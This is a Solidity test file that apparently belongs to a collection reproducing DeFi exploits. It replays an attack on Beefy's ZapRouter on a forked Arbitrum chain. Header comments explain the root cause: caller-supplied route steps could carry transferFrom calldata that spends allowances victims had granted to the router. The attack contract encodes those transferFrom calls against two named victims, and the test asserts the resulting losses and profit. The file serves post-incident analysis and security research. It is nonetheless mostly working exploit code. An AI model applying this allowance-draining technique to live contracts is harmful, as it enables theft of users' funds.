// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 6,584.95 USD
// Attacker : 0x3c6184f4Ee527600Dcc0163cCC47dedd110A6101
// Attack Contract : 0x398A526582dA473750d22e3FE1e3344638865ac0
// Vulnerable Contract : 0xf49F7bB6F4F50d272A0914a671895c4384696E5A
// Attack Tx : https://arbiscan.io/tx/0x536463212dfcdf99616b8fda50795bc8374b07b0cddc505da431f37786d1f857
//
// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xf49F7bB6F4F50d272A0914a671895c4384696E5A#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1664
//
// Attack summary: BeefyZapRouter.executeOrder() lets the caller supply arbitrary route steps. The direct execution path
// only requires msg.sender to equal order.user. The attacker set order.user to its helper contract and supplied route
// steps whose targets were ERC20 vault tokens and whose calldata was transferFrom(victim, attacker, amount).
// Root cause: arbitrary external route execution allowed token transferFrom calldata to spend third-party allowances
// granted to the ZapRouter.

address constant ATTACKER = 0x3c6184f4Ee527600Dcc0163cCC47dedd110A6101;
address constant ATTACK_CONTRACT = 0x398A526582dA473750d22e3FE1e3344638865ac0;
address constant VICTIM_A = 0x402a29fbb2F8b21907f89F257f9CDeD90a815a80;
address constant VICTIM_B = 0x8BC19C94D8e7f0896507bbb399742DAa1e13d26E;
address constant BEEFY_ZAP_ROUTER = 0xf49F7bB6F4F50d272A0914a671895c4384696E5A;
address constant BEEFY_VAULT_A = 0x25071C7Cf437F756a4AF9260aDCe5a639e143F93;
address constant BEEFY_VAULT_B = 0x36295709Ebb6df19f6D78127F8D2e5580AE7336f;

uint256 constant VAULT_A_AMOUNT = 2_782_482_153_324_467_704_932;
uint256 constant VAULT_B_AMOUNT = 2_779_110_877_218_055_686_129;

interface IBeefyZapRouter {
    struct Input {
        address token;
        uint256 amount;
    }

    struct Output {
        address token;
        uint256 minOutputAmount;
    }

    struct Relay {
        address target;
        uint256 value;
        bytes data;
    }

    struct StepToken {
        address token;
        int32 index;
    }

    struct Step {
        address target;
        uint256 value;
        bytes data;
        StepToken[] tokens;
    }

    struct Order {
        Input[] inputs;
        Output[] outputs;
        Relay relay;
        address user;
        address recipient;
    }

    function executeOrder(Order calldata order, Step[] calldata route) external payable;
}

contract ContractTest is BaseTestWithBalanceLog {
    BeefyZapRouterAttack private exploit;

    function setUp() public {
        uint256 forkBlock = 368_133_328;
        vm.createSelectFork("arbitrum", forkBlock);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VICTIM_A, "Victim A");
        vm.label(VICTIM_B, "Victim B");
        vm.label(BEEFY_ZAP_ROUTER, "Beefy ZapRouter");
        vm.label(BEEFY_VAULT_A, "Beefy Vault A");
        vm.label(BEEFY_VAULT_B, "Beefy Vault B");

        exploit = new BeefyZapRouterAttack();
        fundingToken = BEEFY_VAULT_A;
        attacker = address(exploit);
    }

    function testExploit() public balanceLog {
        uint256 victimABefore = IERC20(BEEFY_VAULT_A).balanceOf(VICTIM_A);
        uint256 victimBBefore = IERC20(BEEFY_VAULT_B).balanceOf(VICTIM_B);

        exploit.run();

        assertEq(IERC20(BEEFY_VAULT_A).balanceOf(address(exploit)), VAULT_A_AMOUNT, "vault A profit");
        assertEq(IERC20(BEEFY_VAULT_B).balanceOf(address(exploit)), VAULT_B_AMOUNT, "vault B profit");
        assertEq(victimABefore - IERC20(BEEFY_VAULT_A).balanceOf(VICTIM_A), VAULT_A_AMOUNT, "victim A loss");
        assertEq(victimBBefore - IERC20(BEEFY_VAULT_B).balanceOf(VICTIM_B), VAULT_B_AMOUNT, "victim B loss");
    }
}

contract BeefyZapRouterAttack {
    function run() external {
        IBeefyZapRouter.Order memory order;
        order.inputs = new IBeefyZapRouter.Input[](0);
        order.outputs = new IBeefyZapRouter.Output[](0);
        order.relay = IBeefyZapRouter.Relay({target: address(0), value: 0, data: ""});
        order.user = address(this);
        order.recipient = address(this);

        IBeefyZapRouter.Step[] memory route = new IBeefyZapRouter.Step[](2);
        route[0].target = BEEFY_VAULT_A;
        route[0].value = 0;
        route[0].data = abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM_A, address(this), VAULT_A_AMOUNT);
        route[0].tokens = new IBeefyZapRouter.StepToken[](0);

        route[1].target = BEEFY_VAULT_B;
        route[1].value = 0;
        route[1].data = abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM_B, address(this), VAULT_B_AMOUNT);
        route[1].tokens = new IBeefyZapRouter.StepToken[](0);

        IBeefyZapRouter(BEEFY_ZAP_ROUTER).executeOrder(order, route);
    }
}
